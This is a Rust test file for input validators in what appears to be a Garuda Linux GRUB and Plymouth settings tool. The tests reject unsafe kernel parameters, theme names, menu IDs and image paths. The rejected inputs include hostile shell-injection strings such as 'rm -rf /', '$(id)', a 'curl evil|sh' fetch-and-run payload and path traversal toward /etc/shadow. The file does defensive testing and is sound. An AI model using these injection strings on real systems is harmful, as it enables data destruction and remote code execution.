use crate::{GrubPicture, GrubThemeFile, KernelParameter, MenuEntryId, PlymouthTheme, Reason};

#[test]
fn real_kernel_parameters_pass() {
    for parameter in [
        "quiet",
        "splash",
        "mitigations=off",
        "sysrq_always_enabled=1",
        "root=UUID=3f1c9a52-7d0e-4b6a-9c1f-2e8d5a7b4c10",
        "rootflags=subvol=@",
        "rd.luks.name=3f1c9a52=cryptroot",
        "video=1920x1080@60",
        "acpi_osi=!",
        "ip=[::1]",
        "module_blacklist=nouveau,nvidiafb",
        "resume=/dev/mapper/vg-swap",
        "usbcore.quirks=0bda:8153:k",
        "zswap.max_pool_percent=20%",
    ] {
        assert_eq!(KernelParameter::new(parameter).unwrap().as_str(), parameter);
    }
}

/// Each of these would end the quotes of `GRUB_CMDLINE_LINUX_DEFAULT`,
/// run a command while root sources the file, or start a second line.
#[test]
fn a_kernel_parameter_cannot_leave_its_quotes() {
    for (parameter, culprit) in [
        ("quiet\"", '"'),
        ("a\"; rm -rf /; \"", '"'),
        ("x=$(id)", '$'),
        ("x=`id`", '`'),
        ("x=a\\", '\\'),
        ("it's", '\''),
        ("two words", ' '),
        ("line\nGRUB_DEFAULT=9", '\n'),
        ("nul\0", '\0'),
        ("a;b", ';'),
        ("a|b", '|'),
        ("a&b", '&'),
        ("a>b", '>'),
        ("tab\tbed", '\t'),
        ("ümlaut", 'ü'),
    ] {
        let reason = KernelParameter::new(parameter).unwrap_err().reason();

        assert!(
            matches!(reason, Reason::InvalidCharacter(found) | Reason::InvalidStart(found) if found == culprit),
            "{parameter:?}: {reason:?}"
        );
    }
}

#[test]
fn a_kernel_parameter_is_bounded_and_not_empty() {
    assert_eq!(
        KernelParameter::new("").unwrap_err().reason(),
        Reason::Empty
    );
    KernelParameter::new("a".repeat(255)).unwrap();
    assert_eq!(
        KernelParameter::new("a".repeat(256)).unwrap_err().reason(),
        Reason::TooLong { max: 255 }
    );
}

#[test]
fn a_plymouth_theme_is_one_folder_name_and_never_an_option() {
    for theme in [
        "bgrt",
        "spinner",
        "details",
        "garuda-dr460nized",
        "tribar_2.0",
    ] {
        PlymouthTheme::new(theme).unwrap();
    }

    assert_eq!(
        PlymouthTheme::new("-R").unwrap_err().reason(),
        Reason::InvalidStart('-')
    );
    assert_eq!(
        PlymouthTheme::new("--reset").unwrap_err().reason(),
        Reason::InvalidStart('-')
    );
    assert_eq!(
        PlymouthTheme::new("..").unwrap_err().reason(),
        Reason::InvalidStart('.')
    );
    assert_eq!(
        PlymouthTheme::new("a/b").unwrap_err().reason(),
        Reason::InvalidCharacter('/')
    );
    assert_eq!(
        PlymouthTheme::new("a b").unwrap_err().reason(),
        Reason::InvalidCharacter(' ')
    );
    assert_eq!(
        PlymouthTheme::new("a\nb").unwrap_err().reason(),
        Reason::InvalidCharacter('\n')
    );
    assert_eq!(
        PlymouthTheme::new("a".repeat(65)).unwrap_err().reason(),
        Reason::TooLong { max: 64 }
    );
}

#[test]
fn menu_entry_ids_take_what_grub_writes() {
    for id in [
        "0",
        "1>2",
        "saved",
        "Garuda Linux",
        "gnulinux-advanced-3f1c9a52>gnulinux-linux-zen-advanced-3f1c9a52",
        "Garuda Linux, with Linux linux-zen (fallback initramfs)",
        "  2026-10-09 18:20:11 | @/.snapshots/412/snapshot | pre  | pacman -Syu",
        "Windows Boot Manager (on /dev/nvme0n1p1)",
        "It's mine",
    ] {
        assert_eq!(MenuEntryId::new(id).unwrap().as_str(), id);
    }
}

#[test]
fn a_menu_entry_id_cannot_leave_its_quotes() {
    for (id, culprit) in [
        ("a\"b", '"'),
        ("a$b", '$'),
        ("a`b`", '`'),
        ("a\\b", '\\'),
        ("a\nb", '\n'),
        ("a\0b", '\0'),
        ("a\u{1b}[0m", '\u{1b}'),
    ] {
        assert_eq!(
            MenuEntryId::new(id).unwrap_err().reason(),
            Reason::InvalidCharacter(culprit),
            "{id:?}"
        );
    }

    assert_eq!(MenuEntryId::new("").unwrap_err().reason(), Reason::Empty);
    assert_eq!(
        MenuEntryId::new("--set").unwrap_err().reason(),
        Reason::InvalidStart('-')
    );
    assert_eq!(
        MenuEntryId::new("a".repeat(513)).unwrap_err().reason(),
        Reason::TooLong { max: 512 }
    );
}

#[test]
fn pictures_and_themes_are_plain_absolute_paths_of_their_type() {
    for picture in [
        "/usr/share/wallpapers/garuda/Dr460nized.png",
        "/boot/grub/it's.jpeg",
        "/a.tga",
    ] {
        GrubPicture::new(picture).unwrap();
    }

    GrubThemeFile::new("/usr/share/grub/themes/garuda-dr460nized/theme.txt").unwrap();
}

#[test]
fn a_path_that_is_relative_climbs_or_has_the_wrong_type_is_refused() {
    for (path, reason) in [
        ("", Reason::Empty),
        ("picture.png", Reason::InvalidStart('p')),
        ("~/picture.png", Reason::InvalidStart('~')),
        ("/usr/../etc/shadow.png", Reason::InvalidComponent),
        ("/usr/./a.png", Reason::InvalidComponent),
        ("/usr//a.png", Reason::InvalidComponent),
        ("/usr/a.png/", Reason::InvalidComponent),
        ("/", Reason::InvalidComponent),
        ("/usr/share/a.svg", Reason::WrongFileType),
        ("/usr/share/png", Reason::WrongFileType),
        ("/etc/shadow", Reason::WrongFileType),
        ("/a\".png", Reason::InvalidCharacter('"')),
        ("/a$(id).png", Reason::InvalidCharacter('$')),
        ("/a`id`.png", Reason::InvalidCharacter('`')),
        ("/a\\.png", Reason::InvalidCharacter('\\')),
        ("/a\nb.png", Reason::InvalidCharacter('\n')),
        ("/a\0.png", Reason::InvalidCharacter('\0')),
        ("/a;curl evil|sh.png", Reason::InvalidCharacter(';')),
        ("/a|id.png", Reason::InvalidCharacter('|')),
        ("/a&id.png", Reason::InvalidCharacter('&')),
        ("/a(id).png", Reason::InvalidCharacter('(')),
        ("/a*id.png", Reason::InvalidCharacter('*')),
        ("/a b/c.png", Reason::InvalidCharacter(' ')),
        ("/a\tb/c.png", Reason::InvalidCharacter('\t')),
    ] {
        assert_eq!(
            GrubPicture::new(path).unwrap_err().reason(),
            reason,
            "{path:?}"
        );
    }

    assert_eq!(
        GrubPicture::new(format!("/{}.png", "a".repeat(1024)))
            .unwrap_err()
            .reason(),
        Reason::TooLong { max: 1024 }
    );
    assert_eq!(
        GrubThemeFile::new("/usr/share/grub/themes/x/background.png")
            .unwrap_err()
            .reason(),
        Reason::WrongFileType
    );
    assert_eq!(
        GrubThemeFile::new("/usr/share/grub/themes/../../../etc/theme.txt")
            .unwrap_err()
            .reason(),
        Reason::InvalidComponent
    );
}

#[test]
fn invalid_values_do_not_deserialize() {
    serde_json::from_str::<KernelParameter>("\"a b\"").unwrap_err();
    serde_json::from_str::<PlymouthTheme>("\"-R\"").unwrap_err();
    serde_json::from_str::<MenuEntryId>("\"a$b\"").unwrap_err();
    serde_json::from_str::<GrubPicture>("\"/a/../b.png\"").unwrap_err();
    serde_json::from_str::<GrubThemeFile>("\"theme.txt\"").unwrap_err();
}
